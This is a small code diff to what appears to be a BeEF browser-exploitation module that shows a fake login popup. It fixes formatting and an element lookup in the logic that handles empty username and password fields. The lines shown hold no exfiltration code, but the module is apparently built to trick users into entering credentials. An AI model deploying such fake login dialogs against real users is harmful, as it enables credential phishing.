@@ -93,9 +93,9 @@ beef.execute(function() {
 			$j('#popup').remove();
 			$j('#darkenScreenObject').remove();
 
-		}else if((uname1.length == 0 || pass1.length == 0) && valcheck == "true"){
+		} else if((uname1.length == 0 || pass1.length == 0) && valcheck == "true") {
 			// If user has not entered any data, reset button
-			document.body.lastChild.getElementById("buttonpress").value = "false";
+			document.getElementById("buttonpress").value = "false";
 			alert("Please enter a valid username and password.");		
 		}
 	}
